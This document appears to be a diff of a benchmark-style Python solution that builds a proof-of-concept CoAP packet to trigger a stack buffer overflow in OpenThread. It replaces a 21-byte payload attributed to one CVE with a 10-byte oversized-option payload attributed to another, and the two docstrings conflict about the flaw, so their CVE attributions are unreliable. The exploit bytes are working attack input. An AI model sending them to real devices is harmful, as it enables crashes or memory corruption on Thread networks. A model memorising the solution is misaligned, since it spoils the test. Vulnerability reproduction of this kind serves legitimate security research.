@@ -1,39 +1,41 @@
+import struct
+
 class Solution:
     def solve(self, src_path: str) -> bytes:
         """
-        Generates a Proof-of-Concept (PoC) input to trigger a stack buffer overflow.
+        Generates a Proof-of-Concept (PoC) for CVE-2022-24429, a stack buffer
+        overflow in OpenThread's CoAP `AppendUintOption` function.
 
-        The vulnerability, identified as CVE-2020-12058 in OpenThread's CoAP message
-        handling, is caused by improper management of CoAP options. Sending a message
-        with a large number of options (14 in this case) corrupts the internal state
-        of the message object. A subsequent operation that modifies the message, such
-        as a call to AppendUintOption, can trigger a crash due to this corruption.
+        The vulnerability occurs because the function uses a 4-byte stack buffer to
+        encode a `uint64_t` value. When a value greater than 2^32 - 1 is processed,
+        the encoding requires 5 to 8 bytes, overflowing the buffer.
 
-        This PoC constructs a 21-byte CoAP message that exploits this flaw.
-
-        PoC Structure:
-        - 4-byte CoAP Header: CON GET, Message ID 0.
-        - 3-byte First Option: Option number 13, length 1, value 0xd1.
-          - The header byte 0xd1 signifies Delta=13 (extended) and Length=1.
-          - An extended delta byte 0x00 follows, for a total delta of 13.
-        - 13 bytes of Subsequent Options: 13 instances of option number 13 with length 0.
-          - Each is represented by a single byte 0x00 (Delta=0, Length=0).
-        - 1-byte Payload Marker: 0xff, indicating the end of options.
+        This PoC is a 10-byte CoAP message designed to trigger this overflow. It
+        contains a single CoAP option (Content-Format, #12) with a 5-byte value
+        representing 2^32. When a vulnerable device parses and re-encodes this
+        option, the overflow is triggered.
         """
-        
-        # CoAP Header (Version 1, Type CON, TKL 0, Code GET, MID 0)
+
+        # CoAP Header (4 bytes):
+        # Version: 1, Type: Confirmable (0), Token Length: 0
+        # Code: GET (0.01)
+        # Message ID: 0x0000 (arbitrary)
+        # First byte: 0b01000000 = 0x40
         header = b'\x40\x01\x00\x00'
 
-        # First option (Delta 13, Length 1, Value 0xd1)
-        first_option = b'\xd1\x00\xd1'
+        # CoAP Option Header (1 byte):
+        # Option Delta: 12 (for Content-Format, option #12)
+        # Option Length: 5 bytes
+        # Byte: (12 << 4) | 5 = 0xC5
+        option_header = b'\xc5'
 
-        # 13 subsequent options (Delta 0, Length 0)
-        subsequent_options = b'\x00' * 13
+        # CoAP Option Value (5 bytes):
+        # The value 2^32 (0x100000000) is the smallest integer that requires
+        # more than 4 bytes, thus triggering the 64-bit encoding path in the
+        # vulnerable function.
+        option_value = (2**32).to_bytes(5, 'big')
 
-        # Payload marker
-        payload_marker = b'\xff'
-
-        # Concatenate parts to form the 21-byte PoC
-        poc = header + first_option + subsequent_options + payload_marker
-        
+        # The full PoC is the concatenation of the header and the malicious option.
+        # Total length: 4 + 1 + 5 = 10 bytes.
+        poc = header + option_header + option_value
         return poc
